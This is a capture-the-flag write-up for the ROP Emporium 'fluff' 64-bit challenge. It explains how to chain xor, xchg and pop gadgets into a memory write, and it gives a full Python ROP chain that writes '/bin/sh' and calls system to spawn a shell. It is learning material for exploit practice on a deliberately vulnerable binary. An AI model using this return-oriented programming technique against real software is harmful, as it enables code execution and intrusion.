# fluff - 64 bit

the goal of this challange is very similar to the write4 one.(https://github.com/alal4465/CTF_Writeups/tree/master/ROP%20Emporium%5Bwrite4-64bit%5D)   
      
![hathala](https://user-images.githubusercontent.com/60041914/78301733-34105b80-7542-11ea-9c08-939b18552714.png)
      
we need to write a string to memory,    
point rdi at it,    
and call system with the string as a parameter.     

but this time there is no single gadget that allows for arbitrary write.     
looking at the output from ROPgadget (this time using --depth 20 in hope to find some useful gadgets)     
these gadgets seem interesting:    
```
#0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
#0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
#0x00000000004008c3 : pop rdi ; ret
#0x000000000040084d : pop rdi ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
#0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret
#0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
```
   
using these gadgets, my plan was:
1.empty r11("xor r11, r11")      
2.set r12 to write adress    
3.xor r11 with r12 (r11 is zero so it should set it to r12)      
4.xchg r11 with r10 (r10 now points to dest memory)     
5.empty r11      
6.set r11 to str with those same steps      
7.write r11 to [r10]       
     
after taking care of some unwanted parts of these gadgets    
the ROP chain looks like this:
```python
STR_ADDR=0x006010b0
CALL_SYSTEM=0x004005e0
SET_RDI=0x004008c3
WRITE_MEM=0x0040084d
EMPTY_R11=0x00400822
XOR_R11_R12=0x0040082f
SET_R12=0x00400832
XCHG_R11_R10=0x00400840

def write_str(s,addr,exp):
    #write 8 byte string to memory using creative gadgets
    exp+=p64(EMPTY_R11) # empty r11
    exp+=p64(0x41414141) # garbage r14 value
    exp+=p64(SET_R12) 
    exp+=p64(addr) # set r12 to write adress
    exp+=p64(XOR_R11_R12) # xor r11 r12(0x00 ^ r12 = r12)
    exp+=p64(0x41414141) # garbage r12 value
    exp+=p64(XCHG_R11_R10) # xchg r11, r10
    exp+=p64(0x41414141) # garbage r15 value
    exp+=p64(EMPTY_R11) # xor r11, r11
    exp+=p64(0x41414141) # garbage r14 val
    exp+=p64(SET_R12)
    exp+=s # set R12 to string
    exp+=p64(XOR_R11_R12) # xor r11 r12(0x00 ^ r12 = r12)
    exp+=p64(0x41414141) # garbage
    exp+=p64(WRITE_MEM) # write r11 to [r10] 
    exp+=p64(0x41414141) # garbage rdi val
    exp+=p64(0x41414141) # garbage r13 val
    exp+=p64(0x0) # set r12 to 0 so the xor wont hurt our string
    return exp

exploit=b'A'*40
exploit=write_str(b"/bin/sh\x00",STR_ADDR,exploit)
exploit+=p64(SET_RDI)
exploit+=p64(STR_ADDR)
exploit+=p64(CALL_SYSTEM)

```
      
![ending](https://user-images.githubusercontent.com/60041914/78301739-35418880-7542-11ea-9f3a-8691f7332b5c.png)
     
